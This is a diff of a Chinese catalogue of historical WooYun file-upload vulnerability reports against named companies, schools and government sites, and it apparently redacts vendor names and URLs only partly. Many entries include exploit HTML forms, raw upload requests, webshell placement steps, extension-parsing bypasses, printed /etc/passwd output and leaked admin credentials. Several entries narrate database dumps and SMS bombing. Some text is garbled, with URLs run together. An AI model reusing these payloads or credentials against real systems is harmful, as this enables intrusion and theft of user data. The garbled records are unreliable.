+**POC**: 产品更新时间2013年7月16日查看目录结构是否还存在漏洞文件继续使用以前的exp:<form enctype="multipart/form-data" action="http://[IP已脱敏] method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>测试上传一个文件
 
 **绕过**: 直接利用
 
@@ -1060,7 +1060,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 再暴用友ICC网站客服系统任意文件上传漏洞，看了一下上一个漏洞：WooYun: 用友ICC网站客服系统远程代码执行漏洞，发现还存在其它的上传漏洞。不知是不是还没升级完成或是什么问题，但测试多个网站均存在漏洞。/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php(相关上传的也同样有)<?php/*** screenImagesSave.php**/require_once('../global.inc.php');//get request.$ft = intval($_REQUEST['ft']);/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$dest
+**详情**: 再暴用友ICC网站客服系统任意文件上传漏洞，看了一下上一个漏洞：WooYun: 用友ICC网站客服系统远程代码执行漏洞，发现还存在其它的上传漏洞。不知是不是还没升级完成或是什么问题，但测试多个网站均存在漏洞。/home/ecccs/web/5107https://example.com/[已脱敏])<?php/*** screenImagesSave.php**/require_once('../global.inc.php');//get request.$ft = intval($_REQUEST['ft']);/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$dest
 
 **POC**: (见原文)
 
@@ -1070,8 +1070,8 @@
 ---
 
 ---
-### [wooyun-2012-05842] 中国电信上传漏洞
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 成功的入侵事件
+### [wooyun-2012-05842] 某运营商上传漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 成功的入侵事件
 
 **元思考**: 触发信号: 上传功能
 
@@ -1082,9 +1082,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传漏洞  而已http://ict.chinatelecom.com.cn/ict/pages/Browser.jsp?sort=1&file=%2Fopt%2Ftomcat%2Fwebapps%2Fict%2Fict%2Fpages%2Fmadman.jsp
+**详情**: 上传漏洞  而已https://example.com/[已脱敏]
 
-**POC**: http://ict.chinatelecom.com.cn/ict/pages/Browser.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1104,7 +1104,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tv.gcu.edu.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/day_141028/201410281221219991.html
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 可直接上传html 丨1.asp；jpg丨txt等
 
@@ -1126,7 +1126,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pms.zhuzher.com 客房管家PMS登录后员工信息管理照片任意文件上传POST /uploadEmployeePhoto.html HTTP/1.1Host: pms.zhuzher.comProxy-Connection: keep-aliveContent-Length: 87688Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://pms.zhuzher.com数据库为分布式，先找数据库配置主库连上后查找数据库帐号密码连接表随便选择一个库连接，会员数统计会员信息
+**详情**: https://example.com/[已脱敏] 客房管家PMS登录后员工信息管理照片任意文件上传POST /uploadEmployeePhoto.html HTTP/1.1Host: pms.zhuzher.comProxy-Connection: keep-aliveContent-Length: 87688Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏]
 
 **POC**: 订单表
 
@@ -1136,8 +1136,8 @@
 ---
 
 ---
-### [wooyun-2012-06870] 支付宝某频道任意文件上传漏洞
-**厂商**: 支付宝 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-06870] 某电商平台某频道任意文件上传漏洞
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -1148,9 +1148,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 频道：http://job.alipay.com/支付宝招聘在修改简历时附件上传那里，由于没有判断上传类型，造成文件上传漏洞。抓包改包。POST /index.php?r=attachment/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5User-Agent: Shockwave FlashHost: job.alipay.comContent-Length: 776Connection: Keep-AliveCache-Control: no-cacheCookie: 这里自己加上------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: fo
+**详情**: 频道：https://example.com/[已脱敏] /index.php?r=attachment/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5User-Agent: Shockwave FlashHost: job.alipay.comContent-Length: 776Connection: Keep-AliveCache-Control: no-cacheCookie: 这里自己加上------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: fo
 
-**POC**: http://job.alipay.com/resume/resumeattach/other/201205/20120509_050149_13.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1159,7 +1159,7 @@
 
 ---
 ### [wooyun-2015-0123739] 无线苏州APP 私信遍历/短信轰炸/任意文件上传
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 未授权访问/权限绕过
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 未授权访问/权限绕过
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -1170,7 +1170,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2015-0111690 看到这个洞最后报给中移动所以厂商填了中国移动。1.大多数用户操作都有登录校验，除了查看私信。这里遍历ID达到查看他人私信目的。2.绑定手机处的验证码获取接口缺少校验导致短信轰炸。3.头像上传处php被封了，html依旧潇洒，菠菜网站最喜欢。
+**详情**: https://example.com/[已脱敏] 看到这个洞最后报给中移动所以厂商填了某运营商。1.大多数用户操作都有登录校验，除了查看私信。这里遍历ID达到查看他人私信目的。2.绑定手机处的验证码获取接口缺少校验导致短信轰炸。3.头像上传处php被封了，html依旧潇洒，菠菜网站最喜欢。
 
 **POC**: 同上。
 
@@ -1192,7 +1192,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ebfcn.com/任意上传。注册一个账号。然后来到这里http://www.ebfcn.com/Job/JobInfo.aspx上传没有任何过滤，直接上传看下权限多大。同ip网站再来看数据库配置这么简单的数据库名字，超级容易被猜到。由于证劵。点到为止。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1214,7 +1214,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先来到注册会员处：http://www.dadicinema.com/member/reg/chnreg.shtml，有个头像上传，果断先传个试试，burp suite再抓个包：，发现网站是asp.net写的，我就把内容改成了aspx一句话，然后把jpg直接改成aspx试试，上传成功：，。然后翻了下会员数据，目测感觉竟然有22W之多，。好歹也是影院的主站，上传的地方一点限制都没有，哎~~
+**详情**: 先来到注册会员处：https://example.com/[已脱敏] suite再抓个包：，发现网站是asp.net写的，我就把内容改成了aspx一句话，然后把jpg直接改成aspx试试，上传成功：，。然后翻了下会员数据，目测感觉竟然有22W之多，。好歹也是影院的主站，上传的地方一点限制都没有，哎~~
 
 **POC**: 。求票啊求票。。。
 
@@ -1258,9 +1258,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ftp://202.120.53.237/
+**详情**: ftp://[IP已脱敏]
 
-**POC**: 另外的FTP账号密码：上海交通大学：关于GED耐久的解释：http://www.docin.com/p-279278792.html应该是最新发动机的实验室。
+**POC**: 另外的FTP账号密码：上海交通大学：关于GED耐久的解释：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1346,7 +1346,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 弱口令http://project.ccidnet.com/cases/index.shtml登录点无验证码，直接爆破获得一组用户名密码test/Test1234562. 任意文件上传这里可以上传任意文件
+**详情**: 1. 弱口令https://example.com/[已脱敏] 任意文件上传这里可以上传任意文件
 
 **POC**: 传了个jspspy上去，望删除struts2架构，直接root权限了root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync mail:x:8:12:mail:/var/spool/mail:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin 
 
@@ -1378,8 +1378,8 @@
 ---
 
 ---
-### [wooyun-2015-0116407] 中国电信某重要系统漏洞打包
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2015-0116407] 某运营商某重要系统漏洞打包
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 认证接口
 
@@ -1390,9 +1390,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信微号地址：http://124.126.119.144/该系统运行允许使用电信短信密码以及中国电信通行证进行登录，可见其厉害之处这里我要用我大移动手机进行注册，但是系统提示仅允许电信号注册，切看我如何绕过限制没错，就是这里，忘记密码处没有对移动手机号码进行判断，导致大移动成功收到验证短信，且短信可用于用户注册。此处存在短信任意发送漏洞，可指定任意手机号进行短信轰炸
+**详情**: 某运营商微号地址：http://[IP已脱敏]
 
-**POC**: 通过获取到的注册码进行用户注册在注册的时候可以选择个人或者企业，我选择了企业就这样我用138段的移动号码成功注册了一个所谓的微号居然还有免费的短信限额在素材菜单里，存在越权操作他人素材的漏洞在素材预览时，抓包，可以获取到素材id，该id按一定规则递增，可通过遍历得到他人素材路径比如POSThttp://124.126.119.144/pnumber/picMgrJson/picMgr_getPicInfo.do HTTP/1.1Host: 124.126.119.144Connection: keep-aliveContent-Length: 15Accept: */*Origin: http
+**POC**: 通过获取到的注册码进行用户注册在注册的时候可以选择个人或者企业，我选择了企业就这样我用138段的移动号码成功注册了一个所谓的微号居然还有免费的短信限额在素材菜单里，存在越权操作他人素材的漏洞在素材预览时，抓包，可以获取到素材id，该id按一定规则递增，可通过遍历得到他人素材路径比如POSThttp://[IP已脱敏] HTTP/1.1Host: [IP已脱敏]Connection: keep-aliveContent-Length: 15Accept: */*Origin: http
 
 **绕过**: 过滤绕过
 
@@ -1412,9 +1412,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试多个网站均存在漏洞。/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php具体自己看源码这里直接给出利用代码。<form enctype="multipart/form-data" method="post"action="http://icc.5107.cn/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php?filename=jpg.php."><input type="file" name="file"><input type="submit" name="up" value="上传"></form>上一个是jpg.php 这个是只要在jpg.
+**详情**: 测试多个网站均存在漏洞。/home/ecccs/web/5107https://example.com/[已脱敏] enctype="multipart/form-data" method="post"action="https://example.com/[已脱敏]"><input type="file" name="file"><input type="submit" name="up" value="上传"></form>上一个是jpg.php 这个是只要在jpg.
 
-**POC**: http://icc.5107.cn/data/guige.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1434,7 +1434,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接输入url：http://123.233.119.251:8083/sdgphttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/可看到该目录下所有文件，从路径名判断应该是个上传附件的目录，而且从文件名判断很多文件上传日期很新，应该是还在使用中的系统。另外该目录里部分文档内容被google收录：ip反查可知该地址隶属于山东省财政信息中心：
+**详情**: 直接输入url：http://[IP已脱敏]
 
 **POC**: 可以看到所有该目录下面文件的内容，包括一些合同附件等
 
@@ -1456,9 +1456,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://product.news.sohu.com/admin/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://product.news.sohu.com/admin/nor_upload_inc.php 本地限制脚本执行  可直接上传
+**POC**: https://example.com/[已脱敏] 本地限制脚本执行  可直接上传
 
 **绕过**: 直接利用
 
@@ -1480,7 +1480,7 @@
 
 **详情**: 百米生活，通过免费商业Wi-Fi的铺设，在全国各城市打造一个基于本地化社区的电子商务服务平台，为商家提供产品推广、品牌宣传、商家管理及成本控制等服务；为消费者带来社区附近衣食住行、吃喝玩乐的信息服务，同时借助免费Wi-Fi技术支持，开启移动互联网的全新生活方式。据资料显示  该公司的百米生活路由器已经遍布全国多个省市了，用户多达数十万！不可否认这是全国最NB的一个（广告路由器） 说实话他这个路由器穿透力确实够NB赞一个   就是广告太多了一切起因皆因贵公司的广告    特么的深深的打动了我  才有了今天的故事废话就不多说了  直接上漏洞证明
 
-**POC**: 官网www.100msh.com漏洞出现在http://open.100msh.com  开发者平台存在任意文件上传首先我们先注册用户http://open.100msh.com/user/register_dev.html此处填写信息写完之后来到我们的个人资料-上传我们的php一句话点击提交  会提交请上传jpg文件  这个不管他  返回页面的时候我们的一句话已经上传了http://img.100msh.net//developer/credential_file/12e31512040936467884.php我们的php一句话已经执行让人激动不已  里面有主站以及多个分站  开发站点等 
+**POC**: 官网www.100msh.com漏洞出现在https://example.com/[已脱敏]  开发者平台存在任意文件上传首先我们先注册用户https://example.com/[已脱敏]  会提交请上传jpg文件  这个不管他  返回页面的时候我们的一句话已经上传了https://example.com/[已脱敏]  里面有主站以及多个分站  开发站点等 
 
 **绕过**: 直接利用
 
@@ -1500,7 +1500,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看似不注意的地方就会成为入侵的绝对关键这次的入侵时因为一个上传漏洞导致的在漏洞扫描过程中发现fck上传的地方，哈哈http://yinshua.gaitu.com/FCKeditor/editor/filemanager/browser/default/connectors/test.html之后经过探究，没办法解析aspx大马，只能上小马咯之后就一发不可收拾了。这是木马的地址之后我下载了Web.config 来查看看，泄露了很多东西哦！！ftp的地址我google了一下，是img分站的，只能写之后查看了数据库连接账号和密码，能够连接成功哦！！160万用户信息可危险了呢，最后我添加一个文件到主站，看看值得一提的是，这个站的ip就是主站的ip而且，其他基本全部站都在这个服务器上看这是比较重要的几个站地址再拿一个站测试下所以说是全站沦陷啦！！
+**详情**: 看似不注意的地方就会成为入侵的绝对关键这次的入侵时因为一个上传漏洞导致的在漏洞扫描过程中发现fck上传的地方，哈哈https://example.com/[已脱敏] 来查看看，泄露了很多东西哦！！ftp的地址我google了一下，是img分站的，只能写之后查看了数据库连接账号和密码，能够连接成功哦！！160万用户信息可危险了呢，最后我添加一个文件到主站，看看值得一提的是，这个站的ip就是主站的ip而且，其他基本全部站都在这个服务器上看这是比较重要的几个站地址再拿一个站测试下所以说是全站沦陷啦！！
 
 **POC**: (见原文)
 
@@ -1588,9 +1588,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 谷歌地址：http://gunduzi.duapp.com/关键字：美工及程序设计:金站网·通易建站漏洞上传：/UpFileForm.asp（在域名后加上）讲解下burp截断吧
+**详情**: 谷歌地址：https://example.com/[已脱敏]
 
-**POC**: 谷歌地址：http://gunduzi.duapp.com/关键字：美工及程序设计:金站网·通易建站漏洞上传：/UpFileForm.asp（在域名后加上）讲解下burp截断吧先代理本地ipburp截断点击GO！！OK!成功拿下。。这一分钟拿成百上千的站啊。。
+**POC**: 谷歌地址：https://example.com/[已脱敏]
 
 **绕过**: 截断攻击
 
@@ -1612,7 +1612,7 @@
 
 **详情**: 
 
-**POC**: http://www.301hn.cn/manage/login.asp  admin admin目录遍历任意文件上传
+**POC**: https://example.com/[已脱敏]  admin admin目录遍历任意文件上传
 
 **绕过**: 直接利用
 
@@ -1621,7 +1621,7 @@
 
 ---
 ### [wooyun-2014-059038] 山西电信某分站任意文件上传
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -1632,7 +1632,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://59.49.20.242/注册之后填写简历
+**详情**: http://[IP已脱敏]
 
 **POC**: ↑
 
@@ -1676,7 +1676,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、http://oa.ahzzyw.com存在测试账号，用户名test，密码test。2、进入后在撰写邮件时，发现使用了FCK，并可上传木马。3、发现服务器上有N多网站，通过web.config可一一连接数据库进入。4、数据库有大量敏感信息，例如账号密码（大部分未加密）、身份证、资金补贴、往来邮件等等。5、最后还是值得表扬一下，数据库进行了降权，账号权限都进行了较为严格的划分控制，虽然仍然不能抵挡，但至少增加了很多障碍。
+**详情**: 1、https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1720,7 +1720,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 继 http://wooyun.org/bugs/wooyun-2010-053280 之后， demo.javapms.com 修复了漏洞，无法上传jspx.但修补方式只检验表单Content-Type，所以上传漏洞依然存在.
+**详情**: 继 https://example.com/[已脱敏] 之后， demo.javapms.com 修复了漏洞，无法上传jspx.但修补方式只检验表单Content-Type，所以上传漏洞依然存在.
 
 **POC**: 注册用户，修改头像处上传jspx，修改Content-Type绕过检查.用户数7K，小众
 
@@ -1752,8 +1752,8 @@
 ---
 
 ---
-### [wooyun-2012-07914] 腾讯某分站任意文件上传漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-07914] 某互联网公司某分站任意文件上传漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -1764,7 +1764,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://young.edu.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/pop1.jspncPOST https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/doUpload.jsp?picname=2012552131381371.jsp HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1GI3ei4ae0GI3Ij5Ij5ei4ae0Ij5User-Agent: Shockwave FlashHost: young.edu.qq.comContent-Length: 470Connection: Keep-AliveCache-Control
+**详情**: 地址：https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1GI3ei4ae0GI3Ij5Ij5ei4ae0Ij5User-Agent: Shockwave FlashHost: young.edu.某互联网公司.comContent-Length: 470Connection: Keep-AliveCache-Control
 
 **POC**: (见原文)
 
@@ -1796,8 +1796,8 @@
 ---
 
 ---
-### [wooyun-2012-010439] 腾讯分站一上传任意执行
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-010439] 某互联网公司分站一上传任意执行
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -1808,7 +1808,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯分站一上传任意执行
+**详情**: 某互联网公司分站一上传任意执行
 
 **POC**: (见原文)
 
@@ -1852,9 +1852,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随手记任意文件上传听说随手借钱挺好使，注册了个号准备买个会员先试试传头像的时候先发现可以选择全部文件，选了个qq.exe点上传，右下角流量动了下，提示：格式不正确，开firebug，再上传，返回了文件路径。。。。http://money.feidee.com/u06https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/icon/ + 相对路径
+**详情**: 随手记任意文件上传听说随手借钱挺好使，注册了个号准备买个会员先试试传头像的时候先发现可以选择全部文件，选了个某互联网公司.exe点上传，右下角流量动了下，提示：格式不正确，开firebug，再上传，返回了文件路径。。。。https://example.com/[已脱敏] + 相对路径
 
-**POC**: http://money.feidee.com/u06https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/icon/001/500/594/143/1343828771211.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1876,7 +1876,7 @@
 
 **详情**: <input type="hidden" name="filepath" value="Account/adminindex/1.asp;"><input type="hidden" name="filelx" value="jpg">可以解析图片马
 
-**POC**: exp  上传shell.php.jpg<form name=”uploadForm” style=”margin:0;padding:0;” method=”post” enctype=”multipart/form-data” action=”http://xxxxx.com/maq/upload.php”><input type=”hidden” name=”fileName” id=”fileName” value=”shell.php;.jpg” /><input type=”hidden” name=”attachPath” id=”fileName” value=”maq/pic
+**POC**: exp  上传shell.php.jpg<form name=”uploadForm” style=”margin:0;padding:0;” method=”post” enctype=”multipart/form-data” action=”https://example.com/[已脱敏] type=”hidden” name=”fileName” id=”fileName” value=”shell.php;.jpg” /><input type=”hidden” name=”attachPath” id=”fileName” value=”maq/pic
 
 **绕过**: 直接利用
 
@@ -1896,7 +1896,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://xlzx.nju.edu.cn/  南京大学心理健康教育与研究中心，用的心海心理管理系统，文件上传漏洞未修复http://xlzx.nju.edu.cn/inc/upload.asp?fl=1.asp;1  上传地址上传jpg格式的asp木马利用解析漏洞，菜刀连接大量提权补丁未补上
+**详情**: https://example.com/[已脱敏]  南京大学心理健康教育与研究中心，用的心海心理管理系统，文件上传漏洞未修复https://example.com/[已脱敏]  上传地址上传jpg格式的asp木马利用解析漏洞，菜刀连接大量提权补丁未补上
 
 **POC**: (见原文)
 
@@ -1920,7 +1920,7 @@
 
 **详情**: 内容很简单，就是一个上传。
 
-**POC**: 首先上传文件地址：http://hayao.com/home_registration.aspx路径是这个，上传文件会判断后缀，仅仅是后缀。。。普通的webshell传了几个 发现失败了。后来想到了.NET 文件包含。然后做了一个文件包含的webshell.两个文件，第一个文件 是shell内容. 另外加了图片的文件头.进行提交后，记录上传的图片路径，http://hayao.com/UploadFile/201515/EJ2I8RC201515.jpg看起来只是一个图片而已。。。然后进行第二步，传输调用页面。前面说了，它只验证后缀.jpg (我只是测试了.jpg， 其他没有了。。)都说了是文
+**POC**: 首先上传文件地址：https://example.com/[已脱敏] 发现失败了。后来想到了.NET 文件包含。然后做了一个文件包含的webshell.两个文件，第一个文件 是shell内容. 另外加了图片的文件头.进行提交后，记录上传的图片路径，https://example.com/[已脱敏] (我只是测试了.jpg， 其他没有了。。)都说了是文
 
 **绕过**: 直接利用
 
@@ -1962,9 +1962,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 撞裤http://anbn.spacechina.com/admin/被挂菠菜alt.spacechina.com/guoji/856/185/066/calt.spacechina.com/news/774/index.htmlcalt.spacechina.com/news/list_13.html上传漏洞http://anbn.spacechina.com/include/uploadAttr.jsp?file_type=1&root_id=3s6260274wkC717抓包改包即可四川航天研究院 注入http://scaat.spacechina.com/picnew.asp?id=719直接sa 。可执行系统命令。
+**详情**: 撞裤https://example.com/[已脱敏] 注入https://example.com/[已脱敏] 。可执行系统命令。
 
-**POC**: http://anbn.spacechina.com/include/uploadAttr.jsp?file_type=1&root_id=3s6260274wkC717抓包改包即可四川航天研究院 注入http://scaat.spacechina.com/picnew.asp?id=719直接sa 。可执行系统命令。
+**POC**: https://example.com/[已脱敏] 注入https://example.com/[已脱敏] 。可执行系统命令。
 
 **绕过**: 直接利用
 
@@ -1973,7 +1973,7 @@
 
 ---
 ### [wooyun-2014-086316] 某省移动主站可被入侵
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -1986,11 +1986,11 @@
 
 **详情**: 客服导致
 
-**POC**: 域名：js.10086.cn 存在任意文件上传（中国移动网上在线客服，图片处）------------详情--------http://www.js.10086.cn/iRobot/index.jsp?type=1开启burp抓包，研究了下/iRobot/page/common/fileimg.jsp?flag=success&&suffix=c:\xxxx是干嘛的？？  修改成jsp试试。。。。POST /iRobot/page/common/fileimg.jsp?flag=success&&suffix=jsp HTTP/1.1Host: www.js.10086.cnProxy-Con
+**POC**: 域名：js.10086.cn 存在任意文件上传（某运营商网上在线客服，图片处）------------详情--------https://example.com/[已脱敏]  修改成jsp试试。。。。POST /iRobot/page/common/fileimg.jsp?flag=success&&suffix=jsp HTTP/1.1Host: www.js.10086.cnProxy-Con
 
 **绕过**: 直接利用
 
-**修复**: http://www.js.10086.cn/iRobot/pic/20141111/13401462424/2014111116384141.jsphttp://js.10086.cn/iRobot/pic/20141012/15751540161/20141012194410263.jsp?cm
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -2006,9 +2006,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考漏洞：http://wooyun.org/bugs/wooyun-2010-02750ZCMS版本太低导致。除此之外，ZCMS在编辑文章的附件上传中没有做类型限制，仅仅是添加了“自定义类型”。而其在文件管理中做了限制，这就很费解。这是不是一个通用性问题？回来测试下吧。PS：看日志已经有人上传过jsp大马了。从IP来看是本校校园网用户，IP段应该是榆中校区学生宿舍。
+**详情**: 参考漏洞：https://example.com/[已脱敏]
 
-**POC**: http://xxxy.lzu.edu.cn/zcms/SSO.jsp?u=admin&t=1&s=ff1168b33fe9e33841bb9814c58a098d
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2074,7 +2074,7 @@
 
 **详情**: 易车网某分站存在任意文件上传漏洞
 
-**POC**: 易车网某分站存在任意文件上传漏洞在进行找后台的时候发现这个地址admin.bitauto.com很奇葩于是进行 搜索发现上传地址http://admin.bitauto.com/support/pluginpage/flashUpload/FlashUpload.aspx
+**POC**: 易车网某分站存在任意文件上传漏洞在进行找后台的时候发现这个地址admin.bitauto.com很奇葩于是进行 搜索发现上传地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2116,7 +2116,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在用户头像上传那里未过滤，导致任意文件上传。http://www.xmb.com.cn/
+**详情**: 在用户头像上传那里未过滤，导致任意文件上传。https://example.com/[已脱敏]
 
 **POC**: 新建
 
@@ -2126,8 +2126,8 @@
 ---
 
 ---
-### [wooyun-2013-020509] 腾讯某儿童分站文件上传漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2013-020509] 某互联网公司某儿童分站文件上传漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -2138,9 +2138,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://fun.kid.qq.com/进入个人中心有一个头像上传处可以传危险文件例如JSP 但是不能够执行但是一部分后缀名应该过滤了吧。。
+**详情**: https://example.com/[已脱敏] 但是不能够执行但是一部分后缀名应该过滤了吧。。
 
-**POC**: http://data1.class.qq.com/funshow/2013-03-23/s_13639714627850.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2182,9 +2182,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个被人上传的木马http://www.jslottery.com/manage/fckeditor/editor/skins/default/images/toolbar.end.asp;1_2.gif被人安装了Easy File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat
+**详情**: 这个被人上传的木马https://example.com/[已脱敏] File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat
 
-**POC**: http://www.jslottery.com/manage/fckeditor/editor/skins/default/images/toolbar.end.asp;1_2.gif被人安装了Easy File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat
+**POC**: https://example.com/[已脱敏] File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat
 
 **绕过**: 直接利用
 
@@ -2226,7 +2226,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gzdaily.dayoo.com/bison/commons/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/jsp/connectorFckeditor编辑器文件上传没有过滤，直接可以上传jsp文件。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: Fckeditor编辑器文件上传没过滤，直接获取webshell；网站目录；网站服务器ip地址，是内网地址喔！！！root权限，可以查看/etc/shadow文件。
 
@@ -2248,9 +2248,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 服务器找到的，大概就是这破系统。地址：http://jxt.cqedu.net/       （cqedu，沙坪坝是重庆教育区）管理员账户：admin  密码：.admin.   （注意哦有标点）#正题登录一个普通账号，在-教师办公-内部邮箱-附件选择附件选择一个aspx木马文件，选择一个发信人(可以选自己(┬＿┬))于是自己给自己发一条信息，然后去新信箱查看下载附件就知道木马地址：http://jxt.cqedu.net/TeachPhoto/2012015/FJ7.aspx
+**详情**: 服务器找到的，大概就是这破系统。地址：https://example.com/[已脱敏]       （cqedu，沙坪坝是重庆教育区）管理员账户：admin  密码：.admin.   （注意哦有标点）#正题登录一个普通账号，在-教师办公-内部邮箱-附件选择附件选择一个aspx木马文件，选择一个发信人(可以选自己(┬＿┬))于是自己给自己发一条信息，然后去新信箱查看下载附件就知道木马地址：https://example.com/[已脱敏]
 
-**POC**: 家校互动下有短信功能，试了下：菜刀：http://jxt.cqedu.net/TeachPhoto/2012015/FJ3.aspx        pass怀疑是学校计算机老师作案，老是收到诈骗升学广告短信等。
